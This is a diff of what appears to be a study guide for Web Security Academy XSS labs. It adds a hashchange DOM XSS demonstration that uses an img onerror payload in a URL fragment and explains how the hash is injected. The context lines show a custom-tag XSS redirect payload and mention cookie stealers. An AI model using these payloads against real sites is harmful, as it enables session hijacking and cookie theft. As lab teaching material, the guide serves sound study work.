@@ -600,7 +600,17 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 [z3nsh3ll - explaining custom tags for XSS attacks](https://youtu.be/sjs6RS7lURk)  
   
-### OnHashChange  
+### OnHashChange
+
+> Before trying out different XSS Cookie Stealers, let's take a look at the payload locally:
+
+```
+https://0ab2007f0321177c85642b1300f500be.web-security-academy.net/#<img%20src=1%20onerror=alert(1)>
+```
+
+![Result xss hashchange](images/xss_hashchange.png)
+
+As we can see, HTML code is injected in DOM (see image above) and executed. `window.location.hash.slice(1)` takes the string after `#` which is the payload being executed.
 
 >Below iframe uses **HASH** `#` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.  
   
